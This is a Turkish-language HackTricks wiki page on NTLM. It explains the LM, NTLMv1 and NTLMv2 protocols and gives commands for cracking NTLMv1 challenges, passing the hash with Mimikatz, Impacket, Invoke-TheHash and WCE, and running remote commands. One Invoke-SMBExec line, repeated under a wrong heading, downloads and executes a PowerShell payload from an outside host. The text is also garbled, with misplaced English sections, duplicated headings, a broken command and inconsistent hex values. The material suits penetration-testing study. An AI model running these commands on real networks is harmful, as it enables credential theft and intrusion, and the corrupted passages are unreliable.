# NTLM

<details>

<summary><strong>AWS hacklemeyi sıfırdan ileri seviyeye öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

* **Bir siber güvenlik şirketinde mi çalışıyorsunuz?** **Şirketinizi HackTricks'te reklamını görmek ister misiniz?** veya **PEASS'ın en son sürümüne erişmek veya HackTricks'i PDF olarak indirmek ister misiniz?** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
* [**Resmi PEASS & HackTricks ürünlerini alın**](https://peass.creator-spring.com)
* **Katılın** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya beni **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR göndererek HackTricks deposuna** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Temel Bilgiler

**Windows XP ve Server 2003**'ün kullanıldığı ortamlarda, LM (Lan Yöneticisi) hash'leri kullanılır, ancak bunların kolayca ele geçirilebileceği genel olarak kabul edilir. Belirli bir LM hash'i, `AAD3B435B51404EEAAD3B435B51404EE`, LM'nin kullanılmadığı bir senaryoyu temsil eder, boş bir dize için hash'i gösterir.

Varsayılan olarak, **Kerberos** kimlik doğrulama protokolü kullanılan başlıca yöntemdir. NTLM (NT LAN Yöneticisi), belirli durumlarda devreye girer: Etkin Dizin yokluğu, alanın mevcut olmaması, Kerberos'un yanlış yapılandırma nedeniyle çalışmaması veya bağlantılar geçerli bir ana bilgisayar adı yerine bir IP adresi kullanılarak denendiğinde.

Ağ paketlerinde **"NTLMSSP"** başlığının bulunması, bir NTLM kimlik doğrulama sürecini işaret eder.

Kimlik doğrulama protokolleri - LM, NTLMv1 ve NTLMv2 - belirli bir DLL tarafından desteklenir ve bu DLL `%windir%\Windows\System32\msv1\_0.dll` konumundadır.

**Ana Noktalar**:

* LM hash'leri zayıftır ve boş bir LM hash'i (`AAD3B435B51404EEAAD3B435B51404EE`), kullanılmadığını gösterir.
* Kerberos varsayılan kimlik doğrulama yöntemidir, NTLM yalnızca belirli koşullar altında kullanılır.
* NTLM kimlik doğrulama paketleri, "NTLMSSP" başlığıyla tanımlanabilir.
* Sistem dosyası `msv1\_0.dll`, LM, NTLMv1 ve NTLMv2 protokollerini destekler.

## LM, NTLMv1 ve NTLMv2

Hangi protokolün kullanılacağını kontrol edebilir ve yapılandırabilirsiniz:

### GUI

_secpol.msc_ dosyasını çalıştırın -> Yerel politikalar -> Güvenlik Seçenekleri -> Ağ Güvenliği: LAN Yöneticisi kimlik doğrulama seviyesi. 6 seviye bulunmaktadır (0'dan 5'e).

![](<../../.gitbook/assets/image (919).png>)

### Registry

Bu seviyeyi 5 olarak ayarlayacaktır:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Mümkün değerler:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Temel NTLM Alan kimlik doğrulama Şeması

1. **Kullanıcı**, **kimlik bilgilerini** girer
2. İstemci makine, **alan adını** ve **kullanıcı adını** göndererek bir kimlik doğrulama isteği **gönderir**
3. **Sunucu**, **zorluk** gönderir
4. **İstemci**, şifrenin hash'ini anahtar olarak kullanarak **zorluğu şifreler** ve yanıt olarak gönderir
5. **Sunucu**, **alan adını, kullanıcı adını, zorluğu ve yanıtı** içeren bilgileri **Alan Denetleyicisine** gönderir. Eğer yapılandırılmış bir Etkin Dizin yoksa veya alan adı sunucunun adıysa, kimlik bilgileri **yerel olarak kontrol edilir**.
6. **Alan Denetleyicisi**, her şeyin doğru olup olmadığını kontrol eder ve bilgileri sunucuya gönderir

**Sunucu** ve **Alan Denetleyicisi**, **NTDS.DIT** db içinde sunucunun şifresini bildiği için **Netlogon** sunucusu aracılığıyla bir **Güvenli Kanal** oluşturabilir.

### Yerel NTLM Kimlik Doğrulama Şeması

Kimlik doğrulama, **öncekiyle aynıdır ancak** **sunucu**, kimlik doğrulamaya çalışan kullanıcının **hash'ini bilir**. Bu nedenle, Alan Denetleyicisine sormak yerine, **sunucu kendisi kontrol eder** kullanıcının kimlik doğrulayıp doğrulayamayacağını.

### NTLMv1 Zorluk

**Zorluk uzunluğu 8 bayt** ve **yanıt 24 bayt** uzunluğundadır.

**Hash NT (16 bayt)**, **her biri 7 bayt olan 3 parçaya** ayrılır (7B + 7B + (2B+0x00\*5)): **son parça sıfırlarla doldurulur**. Daha sonra, **zorluk** her bir parça ile ayrı ayrı şifrelenir ve **sonuçta** elde edilen şifrelenmiş baytlar **birleştirilir**. Toplam: 8B + 8B + 8B = 24 Bayt.

**Sorunlar**:

* **Rastgelelik eksikliği**
* 3 parça ayrı ayrı **saldırıya uğrayabilir** ve NT hash'i bulunabilir
* **DES çözülebilir**
* 3. anahtar her zaman **5 sıfırdan** oluşur.
* **Aynı zorluk** verildiğinde, **yanıtın** aynı olacaktır. Bu nedenle, kurbanı **1122334455667788** dizesiyle zorlamak ve yanıtı **önceden hesaplanmış gökkuşağı tabloları** kullanarak saldırmak mümkündür.

### NTLMv1 saldırısı

Günümüzde, Ayarlanmamış Delege yapılandırılmış ortamlar bulmak daha az yaygın hale gelmektedir, ancak bu, yapılandırılmış bir Yazıcı Kuyruğu hizmetini **kötüye kullanamayacağınız** anlamına gelmez.

Zaten AD'de sahip olduğunuz bazı kimlik bilgilerini/oturumları kötüye kullanarak, Yazıcı Kuyruğunun, **kontrolünüz altındaki bir ana bilgisayara karşı kimlik doğrulamasını yapmasını** isteyebilirsiniz. Ardından, `metasploit auxiliary/server/capture/smb` veya `responder` kullanarak **kimlik doğrulama zorluğunu 1122334455667788** olarak ayarlayabilir, kimlik doğrulama girişimini yakalayabilir ve eğer **NTLMv1** kullanılarak yapıldıysa **çözebilirsiniz**.\
Eğer `responder` kullanıyorsanız, **kimlik doğrulamasını düşürmek** için **`--lm` bayrağını kullanmayı** deneyebilirsiniz.\
_Bu teknik için kimlik doğrulamanın NTLMv1 kullanılarak yapılması gerektiğini unutmayın (NTLMv2 geçerli değildir)._

Unutmayın ki yazıcı, kimlik doğrulaması sırasında bilgisayar hesabını kullanacak ve bilgisayar hesapları **uzun ve rastgele şifreler** kullanır ki bunları genel **sözlüklerle** muhtemelen **çözemeyeceksiniz**. Ancak **NTLMv1** kimlik doğrulaması **DES kullanır** ([daha fazla bilgi için buraya bakın](./#ntlmv1-challenge)), bu nedenle DES'i çözmeye özel olarak adanmış bazı hizmetler kullanarak bunu çözebilirsiniz (örneğin [https://crack.sh/](https://crack.sh) kullanabilirsiniz).

### hashcat ile NTLMv1 saldırısı

NTLMv1 ayrıca NTLMv1 Çoklu Araç [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) ile kırılabilir, bu araç NTLMv1 ile biçimlendirilmiş mesajları hashcat ile kırılabilir bir yöntemle oluşturur.

Komut
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
## NTLM

### NTLM Hash Dumping

NTLM hash dumping is a common technique used by attackers to obtain password hashes from Windows systems. Attackers can then use these hashes in pass-the-hash attacks to move laterally within a network.

#### Mimikatz

[Mimikatz](https://github.com/gentilkiwi/mimikatz) is a powerful tool that can be used to dump NTLM hashes from memory. Attackers with administrative privileges can use Mimikatz to extract password hashes from the LSASS process.

#### Procdump

[Procdump](https://docs.microsoft.com/sysinternals/downloads/procdump) is another tool that can be used to dump the memory of specific processes. Attackers can use Procdump to dump the LSASS process memory and then extract NTLM hashes using tools like Mimikatz.
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
# NTLM Hash Dumping

## Introduction

NTLM hash dumping is a common technique used by attackers to obtain password hashes from Windows systems. These hashes can then be cracked offline to recover the original passwords, allowing attackers to gain unauthorized access to systems.

## How it Works

1. **Dumping NTLM Hashes**: Attackers can dump NTLM hashes from Windows systems using various tools and techniques, such as Mimikatz or Windows Credential Editor (WCE).

2. **Cracking the Hashes**: Once the hashes are obtained, attackers can use tools like Hashcat or John the Ripper to crack the hashes and recover the original passwords.

3. **Pass-the-Hash Attacks**: Attackers can also use the cracked hashes in pass-the-hash attacks to authenticate to other systems using the stolen credentials.

## Mitigation

To mitigate the risk of NTLM hash dumping, organizations can implement the following security measures:

- **Disable NTLM**: Disable the use of NTLM authentication in favor of more secure protocols like Kerberos.

- **Enforce Complex Passwords**: Require users to use complex and unique passwords to make it harder to crack the hashes.

- **Monitor for Suspicious Activity**: Monitor systems for any suspicious activity that may indicate an ongoing NTLM hash dumping attack.

By following these mitigation strategies, organizations can reduce the risk of NTLM hash dumping and better protect their systems from unauthorized access.
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
Çalıştır hashcat'i (dağıtılmış olarak hashtopolis gibi bir araçla en iyisidir) aksi takdirde bunun için birkaç gün sürecektir.
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
Bu durumda şifrenin "password" olduğunu biliyoruz, bu yüzden demo amaçlı hile yapacağız:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Şimdi, kırılan des anahtarlarını NTLM hash'in parçalarına dönüştürmek için hashcat-utilities kullanmamız gerekiyor:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
Sonunda son kısım:
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
## NTLM Reflection Attack

### Overview

NTLM reflection attack is a technique used to relay NTLM authentication traffic from a target server to a victim client, in order to obtain the victim's NTLM hash. This attack can be used in scenarios where the target server is vulnerable to NTLM relay attacks.

### Usage

1. Set up a rogue server to capture NTLM authentication traffic.
2. Send a phishing email or perform another attack to make the victim's machine connect to the rogue server.
3. Relay the NTLM authentication traffic from the target server to the victim's machine.
4. Capture the victim's NTLM hash for further exploitation.

### Mitigation

To prevent NTLM reflection attacks, it is recommended to:
- Implement SMB signing to prevent relay attacks.
- Use LDAP signing and channel binding.
- Disable NTLM authentication in favor of more secure protocols like Kerberos.
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

**Zorluk uzunluğu 8 bayttır** ve **2 yanıt gönderilir**: Bir tanesi **24 bayt** uzunluğundadır ve **diğerinin** uzunluğu **değişkendir**.

**İlk yanıt**, **istemci ve etki alanı** tarafından oluşturulan **diziyi** kullanarak **HMAC\_MD5** şifreleme yöntemiyle oluşturulur ve **anahtar** olarak **NT hash'in MD4**'ü kullanılır. Daha sonra, **sonuç**, **zorluk**'u şifrelemek için **anahtar** olarak kullanılacaktır. Buna, **8 baytlık bir istemci zorluğu eklenir**. Toplam: 24 B.

**İkinci yanıt**, **birkaç değer** kullanılarak oluşturulur (yeni bir istemci zorlaması, **tekrar saldırılarını önlemek için bir zaman damgası**...).

Eğer **başarılı bir kimlik doğrulama işlemini yakalayan bir pcap**'iniz varsa, etki alanını, kullanıcı adını, zorluğu ve yanıtı almak ve şifreyi kırmak için bu kılavuzu takip edebilirsiniz: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)

## Pass-the-Hash

**Kurbanın hash'ine sahip olduktan sonra**, onu **taklit etmek** için kullanabilirsiniz.\
Bu **hash**'ı kullanan **NTLM kimlik doğrulamasını gerçekleştirecek bir araç** kullanmanız gerekmektedir, **veya** yeni bir **oturum açma** oluşturabilir ve bu **hash**'i **LSASS** içine **enjekte** edebilirsiniz, böylece herhangi bir **NTLM kimlik doğrulaması gerçekleştirildiğinde**, bu **hash** kullanılacaktır. Son seçenek mimikatz'in yaptığı şeydir.

**Lütfen, Parola-the-Hash saldırılarını Bilgisayar hesapları kullanarak da gerçekleştirebileceğinizi unutmayın.**

### **Mimikatz**

**Yönetici olarak çalıştırılması gerekmektedir**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
Bu, mimikatz başlatan kullanıcıların süreçlerini başlatacak ve LSASS içinde kaydedilen kimlik bilgileri, mimikatz parametrelerinin içindekiler olacaktır. Daha sonra, o kullanıcıymış gibi ağ kaynaklarına erişebilirsiniz (`runas /netonly` hilesine benzer ancak düz metin şifresini bilmenize gerek yok).

### Linux üzerinden Hash Taşıma

Linux'ten Pass-the-Hash kullanarak Windows makinelerinde kod yürütme elde edebilirsiniz.\
[**Buradan nasıl yapılacağını öğrenmek için tıklayın.**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)

### Impacket Windows derlenmiş araçları

Windows için [impacket ikili dosyalarını buradan](https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries) indirebilirsiniz.

* **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
* **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
* **atexec.exe** (Bu durumda bir komut belirtmeniz gerekmektedir, cmd.exe ve powershell.exe etkileşimli bir kabuk elde etmek için geçerli değildir)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
* Daha fazla Impacket ikili dosyası bulunmaktadır...

### Invoke-TheHash

Powershell betiklerini buradan alabilirsiniz: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec

#### Invoke-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient

#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum

#### Invoke-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

Bu işlev diğerlerinin **bir karışımıdır**. **Birkaç ana bilgisayar** geçebilir, **bazılarını hariç tutabilir** ve kullanmak istediğiniz **seçeneği seçebilirsiniz** (_SMBExec, WMIExec, SMBClient, SMBEnum_). **SMBExec** ve **WMIExec**'ten **herhangi birini seçerseniz** ancak _**Komut**_ parametresi vermezseniz, yalnızca **yeterli izinlere sahip olup olmadığınızı kontrol eder**.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Kimlik Bilgileri Düzenleyici (WCE)

**Yönetici olarak çalıştırılması gerekmektedir**

Bu araç mimikatz ile aynı işlemi yapacaktır (LSASS belleğini değiştirme).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Kullanıcı adı ve şifre ile manuel Windows uzaktan yürütme

{% content-ref url="../lateral-movement/" %}
[lateral-movement](../lateral-movement/)
{% endcontent-ref %}

## Bir Windows Ana Bilgisayarından Kimlik Bilgilerinin Çıkarılması

**Daha fazla bilgi için** [**bir Windows ana bilgisayarından kimlik bilgilerini nasıl elde edebileceğiniz hakkında bu sayfayı okumalısınız**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**.**

## NTLM Aktarımı ve Yanıtlayıcı

**Bu saldırıları nasıl gerçekleştireceğiniz hakkında daha detaylı kılavuzu okumak için:**

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

## Bir ağ yakalamasından NTLM meydan okumalarını ayrıştırma

**Bunu kullanabilirsiniz** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)
